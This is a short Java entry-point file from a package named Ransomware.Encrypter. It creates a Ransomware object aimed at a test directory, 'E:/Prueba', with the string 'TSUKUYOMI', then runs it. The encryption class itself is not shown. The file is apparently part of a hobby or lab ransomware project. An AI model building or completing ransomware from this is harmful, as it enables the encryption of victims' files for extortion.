package Ransomware.Encrypter;

public class Main {
    public static void main(String[] args) throws Exception{
        Ransomware ransomware = new Ransomware("E:/Prueba","TSUKUYOMI");

        ransomware.execute();
    }
}
